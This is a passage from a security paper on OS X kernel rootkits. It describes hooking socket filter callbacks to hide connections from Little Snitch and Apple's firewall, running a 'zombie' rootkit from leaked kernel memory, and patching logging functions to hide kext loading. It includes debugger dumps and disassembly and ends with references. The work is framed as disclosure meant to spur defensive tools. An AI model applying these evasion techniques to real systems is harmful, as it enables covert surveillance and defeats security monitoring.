(sock_filter_head located at 0xFFFFFF80008AC9F8 in 10.8.2 plus KASLR of
0xe200000 in this example)

Iterating around the tail queue we find the Little Snitch socket filter:

gdb$ print *(struct socket_filter*)0xffffff801483e608
$7 = {
  sf_protosw_next = {
    tqe_next = 0x0, 
    tqe_prev = 0xffffff8014811f08
  }, 
  sf_global_next = {
    tqe_next = 0xffffff801483e508, 
    tqe_prev = 0xffffff801483e718
  }, 
  sf_entry_head = 0xffffff801b29a1c8, 
  sf_proto = 0xffffff800ea2bca0, 
  sf_filter = {
    sf_handle = 0x27e3ea, 
    sf_flags = 0x5, 
    sf_name = 0xffffff7f8eb1357b "at_obdev_ls", 
    sf_unregistered = 0xffffff7f8eb0938f, 
    sf_attach = 0xffffff7f8eb093f9, 
    sf_detach = 0xffffff7f8eb09539, 
    sf_notify = 0xffffff7f8eb095e8, 
    sf_getpeername = 0xffffff7f8eb096a4, 
    sf_getsockname = 0xffffff7f8eb09707, 
    sf_data_in = 0xffffff7f8eb0974f, 
    sf_data_out = 0xffffff7f8eb09bfa, 
    sf_connect_in = 0xffffff7f8eb0a076, 
    sf_connect_out = 0xffffff7f8eb0a295, 
    sf_bind = 0xffffff7f8eb0a446, 
    sf_setoption = 0xffffff7f8eb0a4ff, 
    sf_getoption = 0xffffff7f8eb0a547, 
    sf_listen = 0xffffff7f8eb0a58f, 
    sf_ioctl = 0xffffff7f8eb0a612, 
    sf_ext = {
      sf_ext_len = 0x38, 
      sf_ext_accept = 0xffffff7f8eb0a65a, 
      sf_ext_rsvd = {0x0, 0x0, 0x0, 0x0, 0x0}
    }
  }, 
  sf_refcount = 0x17
}

The sf_name field from sflt_filter structure can be used to match the correct
socket filter, otherwise we would have to find the driver addresses and match
the function pointers that belong to that address space.

Different possibilities exist to hide our network connections from Little Snitch
and also Apple's application firewall (named com.apple.nke.applicationfirewall).
The easiest one is to patch or hook the sf_attach callback. Documentation from
the previously mentioned include file:
/*!
 @typedef sf_attach_func

 @discussion sf_attach_func is called to notify the filter it has been attached
to a socket. The filter may allocate memory for this attachment and use the
cookie to track it. This filter is called in one of two cases:
  1) You've installed a global filter and a new socket was created.
  2) Your non-global socket filter is being attached using the SO_NKE socket
option.
 @param cookie Used to allow the socket filter to set the cookie for this
attachment.
 @param so The socket the filter is being attached to.
 @result If you return a non-zero value, your filter will not be attached to
this socket.
*/
typedef errno_t (*sf_attach_func)(void  **cookie, socket_t so);

Forcing the callback to return a non-zero value will effectively take socket
filter firewalls out of the equation. The problem here is that the socket_t
structure might not have enough information to distinguish the cases we want to
hide - it is too early in the process so there is no address to connect to.
There are two fields that contain the PID information of the last process to
interact with the socket so this can be useful if we already know the PID to
hide connection from/to.

The other callbacks contain "richer" information for our purposes, in particular
the structure sockaddr. If you want/need this type of fine-grain control you
should hook here and use that structure to make your hide or not decision.
As an exercise, to dump the target address you can attach gdb to the kernel and
use the kgmacros command "showsockaddr" on that argument address (assuming you
are breakpointing at the callback address). 

Another piece of information that can be used to control which process is
related to the current socket the is the cookie that is set on attach callback
and passed along to almost all other callbacks. The cookie is a user-defined
structure and the following is a partial reverse of Little Snitch's definition:
struct Cookie
{
(...)
0x48: IOLock *lock;
0x74: pid_t pid; // process to whom the socket belongs to
0x78: int32_t count;
0x7C: int32_t *xxx;  
0x80: int32_t protocol;
0x85: int8_t domain;
0x86: int8_t type;
(...)
}

As in Kauth, the socket filters create a single point of failure where we can
easily hook and filter our "evil" connections. The real difficulty is to find
the head of the socket filter tail queue. Having a disassembler in the rootkit
makes this a easy task, opening the door to easily bypass application firewalls.

----[ 6.5 - Zombie rootkits

The idea here is to explore kernel memory allocations and leaks. Kernel and
kernel extensions share the same memory map, kernel_map, and there are a few
kernel functions "families" to allocate kernel memory:
- kalloc.
- kmem_alloc.
- OSMalloc.
- MALLOC/FREE.
- IOMalloc/IOFree for I/O Kit.

All functions are wrappers for kernel_memory_allocate(). For additional
information check [30], [31] Chapter 6, [13] Chapter 12.

My initial (too complicated idea) was to load the rootkit, hook whatever was
needed, unload the rootkit, and then protect the memory that was used. This
was based in the fact that unloading does not destroy the rootkit memory so
everything would work as long those blocks of memory were not reallocated to
something else. I wanted to edit with kernel memory map and mark those pages as
used.

If we have a rootkit running that is not associated with a kernel extension we
kind of have a zombie rootkit and solve a few problems such as no need to hide
from kextstat, no kernel extension structures to find, etc. I later found out
that Hoglund and Butler had a similar idea in [32] when they describe the
NonPagedPool memory trick - allocate memory in that area, copy the rootkit, and
unload the driver. New ideas are tough to have :-).

Back to the original point...
Simple things usually work better so there is no point in starting with the
complicated method. The easiest way is to create a memory leak and use it to
store the zombie rootkit version. When the original kernel extension is unloaded
all the memory that was previously allocated using one of the functions above
(tested with kalloc and _MALLOC) will not be free'd, creating a kernel memory
leak that we can abuse and profit from.

The beloved ASCII diagram:

load rootkit -> find rootkit -> calculate rootkit -> alloc zombie
                base address          size             memory
                                                          |
                                                          v
unload original <- transfer control <- fix memory <- copy rootkit into
   rootkit            to zombie        protections     zombie memory
                                                        
To unload the original rootkit is extremely easy - we do not need to execute any
additional command, just return KERN_FAILURE from the start function and rootkit
will not be loaded. The zombie rootkit already gained control before this so
there is no problem and we avoid to execute a kextunload command. Simple :-).

The control transfer to zombie code has a small caveat that inherits from
previous paragraph - the start function must return a value so we can't simple
jump into the zombie. Two ideas come to my mind to solve this problem; first we
can hook some kernel function and there transfer control to zombie, second we
can use kernel threads - create a new thread and let the main one return.

To create a kernel thread the function kernel_thread_start() can be used
(include <kern/thread.h> and Mach KPI). Its prototype is:
kern_return_t   
kernel_thread_start(thread_continue_t continuation, void *parameter, thread_t
*new_thread);

Continuation parameter is a C function pointer where new thread will start
execution, parameter is data that we might want to pass to the new thread, and
new_thread a thread reference that the caller is responsible for.

The zombie thread start function should have a prototype like this:
void start_thread(void *parameter, wait_result_t wait)

To set the start function pointer we need to find that function address in the
zombie memory. Symbol information is not available (__LINKEDIT segment is not
loaded) and to avoid reading from the filesystem we can use a quick trick - find
the rootkit base address and find the difference to the address of start
function in the rootkit (since that is in the original rootkit code). Since we
have the zombie start address returned from the memory allocation, we just need
to add the difference and we have the location of the start function inside the
zombie. Computed the function pointer we can now pass it to
kernel_thread_start() and be sure that zombie code will execute.

Next problem...
Copying the original rootkit into the new area invalidates the external symbols
solved when kernel extension was loaded. Kernel extension code is
position independent (PIC) so calls are made referencing the current instruction
address. If we modify the location address and maintain the offset, then the
symbol is not valid anymore and most probably will generate a kernel panic when
executed.

Example:
Rootkit loaded in memory:
gdb$ x/10i 0xffffff7f83ad671c
0xffffff7f83ad671c:  55                            push   rbp
0xffffff7f83ad671d:  48 89 e5                      mov    rbp,rsp
0xffffff7f83ad6720:  48 8d 3d d1 09 00 00          lea    rdi,[rip+0x9d1]       
# 0xffffff7f83ad70f8 <- string reference
0xffffff7f83ad6727:  30 c0                         xor    al,al
0xffffff7f83ad6729:  5d                            pop    rbp
0xffffff7f83ad672a:  e9 61 29 35 7f                jmp    0xffffff8002e29090 <-
call to kernel's printf, solved when kext was loaded

The zombie copy:
gdb$ x/10i 0xffffff80392ba724
0xffffff80392ba724:  55                            push   rbp
0xffffff80392ba725:  48 89 e5                      mov    rbp,rsp
0xffffff80392ba728:  48 8d 3d d1 09 00 00          lea    rdi,[rip+0x9d1]       
# 0xffffff80392bb100 <- string reference will be valid
0xffffff80392ba72f:  30 c0                         xor    al,al
0xffffff80392ba731:  5d                            pop    rbp
0xffffff80392ba732:  e9 61 29 35 7f                jmp    0xffffff80b860d098 <-
this is a random address and will crash when we call this Function

I am not sure if there is a better solution but I opted out to manually fix the
offsets in the zombie code (probably influenced by the quick trick to find the
thread start function). My idea is to build a table of all external symbols we
will need to fix (hardcoded string table or read kext symbol tables from disk)
and solve their addresses. With this information we can disassemble the kernel
and find all references, and also compute the (references's) difference to
the rootkit base address.
The final step is to fix the offsets in the zombie references. We have the
difference for each reference so we can calculate where each reference is
located in the zombie memory and recompute the new offset to the external
symbol. References to the __DATA segment do not need to be fixed - the offsets
remain valid since that segment was copied and relative distance remains the
same. Maybe a bit too much work but the disassembler engine makes this rather
easy to accomplish. If you have a better solution I am eager to read about it.

Returning KERN_FAILURE to kextload will generate noisy log messages about the
rootkit.
/var/log/system.log:
May  7 02:26:10 mountain-lion-64.local com.apple.kextd[12]: Failed to load 
/Users/reverser/the_flying_circus.kext - (libkern/kext) kext (kmod) start/stop 
routine failed.
dmesg:
Kext put.as.the-flying-circus start failed (result 0x5).
Kext put.as.the-flying-circus failed to load (0xdc008017).
Failed to load kext put.as.the-flying-circus (error 0xdc008017).

The dmesg output can be silenced by temporarily patching OSKextLog function or by
directly memory patching the binaries that call this function. The fastest and
easiest way is to do it inside the kernel - solve the symbol and patch the first
instruction to a ret. After rootkit is loaded we can restore original byte and
everything is back to normal.

The syslog output is generated by kextd daemon. Two quick solutions come to my 
mind - one is to patch syslogd as described before, another is to patch kextd.
The symbol used to send the message to syslogd is asl_vlog. It is an external
symbol in kextd. The symbol stub can be temporarily patched into a ret to avoid
failure logging. Find the kextd process from process list, process its Mach-O
header and locate the symbol stub address in __stubs section. Nothing very
complicated!

To detect when to restore the logging features, we can use a quick and dirty
hack. Loop inside the zombie thread until kextload process is finished. Then
the original bytes can be restored and its business as usual but with a zombie
rootkit loaded.

The foundation blocks to zombie rootkits are exposed, the remaining are
implementation details that do not matter much here and can be found in the
attached sample code.

--[ 7 - Caveats & Detection

Writing rootkits is a dangerous and unstable game and that is why it is such a
fun game (or work for those doing it for money). You are always at mercy of
subtle or major changes that can ruin all your efforts and uncloak your toy.
Nevertheless, these are the same reasons why writing rootkits is so fun - you
need to make it as stable and future-proof as possible, and try to think in all
different detection paths. It is a never-ending story, quite frustrating at
times but mentally and creatively challenging.

This paper is considerably huge but still incomplete! There are a few missing
areas and you probably spotted a few problems with some of its approaches. Let
me try to describe some.

One of the main problems is the dependency on proc, task and some other
structures. These are opaque to outsiders for one good reason - they are changed
frequently between major OS X versions. For example, when I was researching I
forgot to include a define and things were not working (lucky or not it was not
crashing the test system). Three different proc_t (and task_t) versions must be
included to create a rootkit compatible with the three latest major OS X
versions. And it is most certain that it will break with a new major release.

In practice there is at least one rather easy way to overcome this difficulty.
The effective number of fields required from proc and task structures is small.
We can resort to information "leaks" from functions referencing those fields and
retrieve the structure offset. Including a disassembler in the rootkit makes
this task easier and safer. There are many suitable functions - small, stable,
and with very few different structures and variables. Many are static, but the
number of exported ones are more than enough for this purpose.

Filesystem checks (offline in particular) are a significant threat to rootkits,
especially when there is a good reference baseline. Good rootkits must try to
keep their filesystem (and memory) footprint to a minimum. One of the usual
weakest points is the rootkit startup. It must be initialised somewhere! OS X
features so many places where this can happen but this information is available
to both defensive and offensive sides. Binaries modification (for example,
kernel extension injection as featured in last Phrack) is a good method but
(easily) detectable by checksum checks.
Regarding this problem, we can try to abuse additional features. OS X contains
many data files that are mutable (sqlite3 databases, for example) and by nature
difficult to checksum. A potential vulnerability using these data files could be
explored and all the rootkit code stored there. Nothing new here, just
remembering additional attacking and storage points.

Extreme care is required with rootkit's code - it must be as bug free as
possible so that any inconsistencies and/or bugs do not reveal its presence, and
must be carefully designed, for example, authentication and encryption on all
communications. It is quite a joke that a simple ioctl call can expose
OS.X/Crisis [4]. There is a "rule" - if it runs, it can be reversed. But lets
not make that so easy, ok?

Duplicating functions to use with the trampoline trick is also a potential
source of problems if those functions are changed in new versions. This can be
avoided by using the original functions - modify the call references or hijack
the function and return to the original one. Using the NOP alignment space
allows us to keep pointers and references inside the kernel memory address space
and less suspicious to an initial analysis.

Detection and creation of tools is the next logical step. OS X lacks this kind
of tools and here lies a good opportunity for future research and development.
The defensive side against rootkits is even more challenging and requires
additional creativity (and maybe kernel knowledge) to develop safer and reliable
detection methods. The challenge is issued :-).

--[ 8 - Final words

This was a long paper and I sincerely hope it was useful in some way to you
who had the time and patience to read it. New ideas are hard to come by and
there (probably) are many here that were somehow previously explored by others. 
Please apologize me if missing attribution - it is only because I do not know or
I am not aware who is the original author/source. It is particularly difficult
when you read so much stuff thru the years.

The full disclosure discussion is extremely complicated and impossible to reach
consensus. Full source code is hereby released because I believe it is the
only (viable) alternative to move things forward and call for additional
research and solutions. OS X is a great platform but it (still) suffers from a
invincibility mystique that it is false and dangerous. There are companies
producing commercial rootkits sold to governments to potentially spy on citizens
(they say criminals, we have no idea since there is no transparency).

Obviously these  tools can be used for legitimate purposes (such as tracking
real bad guys) but also no so legitimate - power corrupts and temptation is
too big to spy and control everyone. A balance is required and it can come
from improved research and defensive tools. Scoffing at the low incentives or
potential difficulties is not the solution - history has shown that there is
always someone who will leap forward and break the establishment.

This paper's goal is not to assist in developing a surveillance dissident death
machine (name kindly suggested by thegrugq!) but to show the different ways it
can be built, and how to detect and protect against them. I can't avoid its
potential bad usage but at least it should make the playing field a bit more
balanced.

Greets to nemo, noar, snare, all my put.as friends (saure, od, spico, kahuna,
emptydir, korn, g0sh, ...), thegrugq, diff-t, tal0n and everyone else at C., the
blog readers and #osxre boys & girls.

And a big middle finger to Apple as a company, born from the hacking spirit and
now transformed against hacking.

Enjoy & have fun,
fG!

--[ 9 - References

[1] ghalen and wowie, Developing Mac OSX kernel rootkits
    http://www.phrack.org/issues.html?issue=66&id=16&mode=txt

[2] prdelka, Rubilyn 0.0.1
    http://www.nullsecurity.net/tools/backdoor.html

[3] 0xfeedbeef, volafox : rubilyn Rootkit Analysis
    http://feedbeef.blogspot.pt/2012/10/volafox-rubilyn-rootkit-analysis.html

[4] fG!, Tales from Crisis
    http://reverse.put.as/2012/08/06/tales-from-crisis-chapter-1-the-droppers-
    box-of-tricks/

[5] snare, Resolving kernel symbols
    http://ho.ax/posts/2012/02/resolving-kernel-symbols/
    
[6] Landon Fuller - Fixing ptrace(pt_deny_attach, ...) on Mac OS X 10.5 Leopard
    http://landonf.bikemonkey.org/code/macosx/Leopard_PT_DENY_ATTACH.20080122.ht
    ml
    
[7] Miller, Charlie & Zovi, Dino Dai, The Mac Hacker's Handbook
    Wiley Publishing, 2009, ISBN: 978-0-470-39536-3
    
[8] Wikipedia, Interrupt descriptor table
    http://en.wikipedia.org/wiki/Interrupt_descriptor_table
    
[9] fG!, bruteforcesysent
    https://github.com/gdbinit/bruteforcesysent
    
[10] OS X ABI Mach-O File Format Reference
     https://developer.apple.com/library/mac/#documentation/developertools/conce
     ptual/MachORuntime/Reference/reference.html

[11] fG!, Secuinside 2012, How to Start your Apple reverse engineering adventure
     http://reverse.put.as/wp-content/uploads/2012/07/Secuinside-2012-Presentati
     on.pdf

[12] fG!, Hitcon 2012, Past and Future in OS X malware
     http://reverse.put.as/Hitcon_2012_Presentation.pdf

[13] Jonathan Levin, Mac OS X and iOS Internals
     Wiley & Sons, 2012, ISBN: 978-1-11805765-0

[14] Amit Singh, Mac OS X Internals
     Addison Wesley, 2007, ISBN: 0-321-27854-2
     
[15] Apple, dyld 210.2.3 source code
     http://www.opensource.apple.com/source/dyld/dyld-210.2.3/

[16] fG!, Anti-debug trick #1: Abusing Mach-O to crash GDB
     http://reverse.put.as/2012/01/31/anti-debug-trick-1-abusing-mach-o-to-crash
     -gdb/
     
[17] Apple, Network Kernel Extensions Programming Guide
     https://developer.apple.com/library/mac/#documentation/Darwin/Conceptual/NK
     EConceptual/intro/intro.html#//apple_ref/doc/uid/TP40001858-CH225-DontLinkE
     lementID_70
    
[18] Apple, tcplognke
     http://developer.apple.com/library/mac/#/legacy/mac/library/samplecode/tcpl
     ognke/Introduction/Intro.html

[19] Gil Dabah, diStorm - Powerful Disassembler Library For x86/AMD64
     http://code.google.com/p/distorm/
     
[20] McKusick et al, The Design and Implementation of the 4.4BSD Oper. System
     Addison Wesley, 1996, ISBN: 0-201-54979-4

[21] fG!, Av-monster: the monster that loves yummy OS X anti-virus software
     http://reverse.put.as/2012/02/13/av-monster-the-monster-that-loves-yummy-os
     -x-anti-virus-software/

[22] Apple, Technical Note TN2127
     https://developer.apple.com/library/mac/#technotes/tn2127/_index.html
    
[23] Cantrill et al, Dynamic Instrumentation of Production Systems
     dtrace_usenix.pdf

[24] Oracle, Solaris Dynamic Tracing Guide
     https://wikis.oracle.com/display/DTrace/Documentation
     
[25] fG!, Abusing OS X TrustedBSD framework to install r00t backdoors...
     http://reverse.put.as/2011/09/18/abusing-os-x-trustedbsd-framework-to-insta
     ll-r00t-backdoors/
 
 [26] Andrew Case, Mac Memory Analysis with Volatility
      http://reverse.put.as/wp-content/uploads/2011/06/sas-summit-mac-memory-ana
      lysis-with-volatility.pdf

 [27] FreeBSD, FreeBSD Handbook
      http://www.freebsd.org/doc/en_US.ISO8859-1/books/handbook/audit-config.htm
      l
      
 [28] Der Flounder, OpenBSD auditing on Mac OS X
      http://derflounder.wordpress.com/2012/01/30/openbsm-auditing-on-mac-os-x/

 [29] OpenBSDM Source Code
      http://www.opensource.apple.com/source/OpenBSM/
      
 [30] Apple, Kernel Programming guide
      https://developer.apple.com/library/mac/#documentation/Darwin/Conceptual/K
      ernelProgramming/vm/vm.html#//apple_ref/doc/uid/TP30000905-CH210-BEHJDFCA
      
 [31] Halvorsen, Ole Henry & Clarke, Dougles, OS X and iOS Kernel Programming
      Apress, 2011, ISBN-10: 1430235365
      
 [32] Hoglund, Greg & Butler, Jamie, Rootkits: Subverting the Windows Kernel
      Addison-Wesley, 2005, ISBN-10: 0321294319
      
 [33] Luka Milkovic, Defeating Windows memory forensics, 29C3
      http://events.ccc.de/congress/2012/Fahrplan/events/5301.en.html
      
 [34] fG!, OS.X/Boubou – Mach-O infector PoC source code
      http://reverse.put.as/2013/03/05/os-xboubou-mach-o-infector-poc-source-cod
      e/
      
 [35] thegrugq, How the Leopard hides his spots
      http://reverse.put.as/wp-content/uploads/2011/06/D1T2-The-Grugq-How-the-Le
      opard-Hides-His-Spots.pdf
      
--[ 10 - T3h l337 c0d3z

--[ EOF
